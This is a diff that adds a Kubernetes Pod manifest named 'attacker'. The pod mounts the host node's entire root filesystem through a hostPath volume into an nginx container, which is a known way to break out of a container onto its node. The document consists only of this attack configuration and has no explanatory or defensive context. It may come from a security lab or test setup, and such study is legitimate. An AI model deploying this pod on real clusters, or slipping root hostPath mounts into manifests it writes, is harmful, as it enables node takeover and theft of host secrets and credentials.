@@ -1,0 +1,20 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: attacker
+  name: attacker
+  namespace: default
+spec:
+  volumes:
+  - name: host-fs
+    hostPath:
+      path: /
+  containers:
+  - image: nginx
+    imagePullPolicy: IfNotPresent
+    name: attacker
+    volumeMounts:
+      - name: host-fs
+        mountPath: /root
+  restartPolicy: Never 
